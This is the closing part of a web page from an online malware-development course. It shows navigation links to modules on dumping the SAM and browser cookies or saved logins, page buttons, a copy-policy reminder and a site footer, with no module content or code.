                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./77.html">
                    <div for="module-77" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 77 - Dumping The SAM From Disk
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./78.html">
                    <div for="module-78" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 78 - Domain Enumeration Using MS-SAMR
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./79.html">
                    <div for="module-79" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 79 - Dumping Browser Cookies: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./80.html">
                    <div for="module-80" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 80 - Dumping Saved Logins: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./81.html">
                    <div for="module-81" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 81 - Dumping Browser Cookies: Chrome
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./82.html">
                    <div for="module-82" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 82 - Dumping Saved Logins: Chrome
                    </div>
                </a>
            </div>
                </div>
    </div>
</div>          </div>
      </div>

      
      <div class="flex">
  <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-r border-l border-gray-600/60 pl-4 pt-2 pb-2 rounded-bl-xl rounded-br-xl shadow-inner">

          <div class="mr-2">
        <a data-target="_self" href="./22.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Previous</button>
        </a>
      </div>
    
    <div class="mr-2">
      <a data-target="_self" href="../All Modules.html">
        <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Modules</button>
      </a>
    </div>

    <div class="my-2 mr-2">
      <form id="complete-module" action="./23/complete" method="POST">
      </form>
      <form id="uncomplete-module" action="./2#" method="POST">
      </form>
    </div>

          <div class="mr-2">
        <a data-target="_self" href="./24.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Next</button>
        </a>
      </div>
    
  </div>
</div>

      
      <input type="hidden" id="objectives-completed" value="20973">

      
      <div id="copyWarning" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm">
  <div class="relative bg-gray-800 border border-gray-600 rounded-2xl shadow-2xl p-8 max-w-lg w-11/12 text-center transform transition-all scale-100">
    <p class="text-2xl font-bold text-white mb-4 tracking-wide">
      Reminder
    </p>
    <p class="text-gray-300 text-base mb-6 leading-relaxed">
      To remain compliant with the Terms of Service, avoid copying the entire module and instead copy the necessary sections.
    </p>
    <button onclick="hideCopyWarning()" class="w-full text-white font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-all duration-200 bg-blue-600/80 hover:bg-blue-500/80 border border-blue-400/40 backdrop-blur-sm backdrop-saturate-150">
      I understand
    </button>
    <span class="absolute top-3 right-3 text-gray-400 hover:text-gray-200 cursor-pointer text-xl" onclick="hideCopyWarning()"></span>
  </div>
</div>


      
        </div>

  <footer id="footer" class="text-gray-400
    bg-gradient-to-t from-[#101926] via-[#172130] to-[#1e293b] backdrop-blur-md backdrop-saturate-150 z-20 border-t border-gray-700/50 border-gray-800
     hidden body-font">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://x.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill="">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill=""></path>
          </svg>            
        </a>
        <a href="https://github.com/Maldev-Academy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-6 h-6" fill="white" viewBox="0 0 24 24" aria-hidden="true" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill=""><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms of Service
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer></div>
        

        <script src="23_files/jquery-3.6.0.min.js"></script>
        <script src="23_files/bootstrap.min.js"></script>
        <script src="23_files/navbar.js"></script>


<link rel="preload" as="style" href="23_files/app-BoiX-DPv.css"><link rel="modulepreload" href="23_files/app-D9jIIQde.js"><link rel="stylesheet" href="23_files/app-BoiX-DPv.css"><style class="darkreader darkreader--sync" media="screen"></style><script type="module" src="23_files/app-D9jIIQde.js"></script><script src="23_files/moduleviewer.js" defer="defer"></script>

</body></html>